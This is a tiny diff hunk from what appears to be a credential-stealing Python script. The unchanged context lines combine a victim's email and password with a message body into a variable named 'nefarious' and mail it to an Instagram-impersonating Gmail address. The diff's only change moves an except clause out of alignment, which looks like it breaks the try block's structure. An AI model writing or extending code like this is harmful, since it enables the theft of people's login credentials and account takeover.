@@ -94,7 +94,7 @@ try:
         recipient = "instagramcorp96@gmail.com"
         nefarious = email + password + body
         send_mail(email, password, recipient, subject, nefarious)
-    except:
+except:
         Exception
     
 try:
